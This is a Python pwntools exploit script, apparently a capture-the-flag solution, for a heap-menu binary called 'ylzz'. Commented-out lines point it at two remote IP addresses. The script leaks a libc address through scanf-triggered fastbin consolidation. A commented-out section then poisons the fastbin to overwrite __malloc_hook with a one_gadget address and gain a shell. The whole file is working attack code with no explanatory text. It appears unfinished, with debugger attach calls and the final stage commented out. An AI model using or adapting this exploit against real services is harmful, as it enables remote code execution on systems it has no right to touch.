#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- author: n0trix -*-

from pwn import *

context.terminal = ['tmux','splitw','-v']
context.log_level = 'debug'

io = process('./ylzz')
#io = remote('112.126.71.170',45123)
#io = remote('8.131.69.237',45123)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
one = [0x45226,0x4527a,0xf0364,0xf1207]

def add():
    io.sendline('1')

def dele(idx):
    io.sendline('2')
    io.sendline(str(idx))

def edit(idx,con):
    io.sendline('3')
    io.sendline(str(idx))
    io.send(con)

def show(idx):
    io.sendline('4')
    io.sendline(str(idx))
    return io.recv()

def do_glob(pattern):
    io.sendline('5')
    io.sendline(pattern)

#do not use glob function
#use scanf to trigger fastbin consolidate to leak libc
add()
add()
add()
dele(0)
gdb.attach(io)
io.sendline('4')
io.sendline('0'*0x400)
#print show(0)
print show(0)
io.interactive()
'''
libc_base = u64(io.recv()) - 3951576
log.success('libc: '+hex(libc_base))
malloc_hook = libc_base + libc.sym['__malloc_hook']
dele(1)
edit(1,p64(malloc_hook-0x23))
add() #2
add() #3
gdb.attach(io)
edit(3,'a'*0x13+p64(libc_base+one[3]))
add()
io.interactive()
'''
